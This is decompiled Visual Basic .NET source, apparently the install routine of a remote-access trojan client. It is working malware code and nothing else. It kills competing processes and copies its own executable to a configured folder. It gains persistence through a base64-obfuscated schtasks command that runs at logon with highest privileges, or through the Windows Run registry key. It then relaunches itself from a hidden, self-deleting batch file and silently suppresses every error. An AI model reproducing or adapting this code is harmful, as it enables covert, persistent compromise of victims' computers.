Imports System
Imports System.Diagnostics
Imports System.IO
Imports System.Text
Imports System.Threading
Imports Client.Helper
Imports Microsoft.Win32

Namespace Client.Install
	' Token: 0x02000009 RID: 9
	Friend Class NormalStartup
		' Token: 0x06000035 RID: 53 RVA: 0x000036D8 File Offset: 0x000018D8
		Public Shared Sub Install()
			Try
				Dim fileInfo As FileInfo = New FileInfo(Path.Combine(Environment.ExpandEnvironmentVariables(Settings.Install_Folder), Settings.Install_File))
				Dim fileName As String = Process.GetCurrentProcess().MainModule.FileName
				If fileName <> fileInfo.FullName Then
					For Each process As Process In Process.GetProcesses()
						Try
							If process.MainModule.FileName = fileInfo.FullName Then
								process.Kill()
							End If
						Catch
						End Try
					Next
					If Methods.IsAdmin() Then
						Process.Start(New ProcessStartInfo() With { .FileName = "cmd", .Arguments = String.Concat(New String() { Encoding.[Default].GetString(Convert.FromBase64String("L2Mgc2NodGFza3MgL2NyZWF0ZSAvZiAvc2Mgb25sb2dvbiAvcmwgaGlnaGVzdCAvdG4g")), """", Path.GetFileNameWithoutExtension(fileInfo.Name), """ /tr '""", fileInfo.FullName, """' & exit" }), .WindowStyle = ProcessWindowStyle.Hidden, .CreateNoWindow = True })
					Else
						Using registryKey As RegistryKey = Registry.CurrentUser.OpenSubKey(Encoding.[Default].GetString(Convert.FromBase64String("U09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUnVuXA==")), RegistryKeyPermissionCheck.ReadWriteSubTree)
							registryKey.SetValue(Path.GetFileNameWithoutExtension(fileInfo.Name), """" + fileInfo.FullName + """")
						End Using
					End If
					If File.Exists(fileInfo.FullName) Then
						File.Delete(fileInfo.FullName)
						Thread.Sleep(1000)
					End If
					Dim stream As Stream = New FileStream(fileInfo.FullName, FileMode.CreateNew)
					Dim array As Byte() = File.ReadAllBytes(fileName)
					stream.Write(array, 0, array.Length)
					Methods.ClientOnExit()
					Dim text As String = Path.GetTempFileName() + ".bat"
					Using streamWriter As StreamWriter = New StreamWriter(text)
						streamWriter.WriteLine("@echo off")
						streamWriter.WriteLine("timeout 3 > NUL")
						streamWriter.WriteLine("START """" """ + fileInfo.FullName + """")
						streamWriter.WriteLine("CD " + Path.GetTempPath())
						streamWriter.WriteLine("DEL """ + Path.GetFileName(text) + """ /f /q")
					End Using
					Process.Start(New ProcessStartInfo() With { .FileName = text, .CreateNoWindow = True, .ErrorDialog = False, .UseShellExecute = False, .WindowStyle = ProcessWindowStyle.Hidden })
					Environment.[Exit](0)
				End If
			Catch ex As Exception
			End Try
		End Sub
	End Class
End Namespace
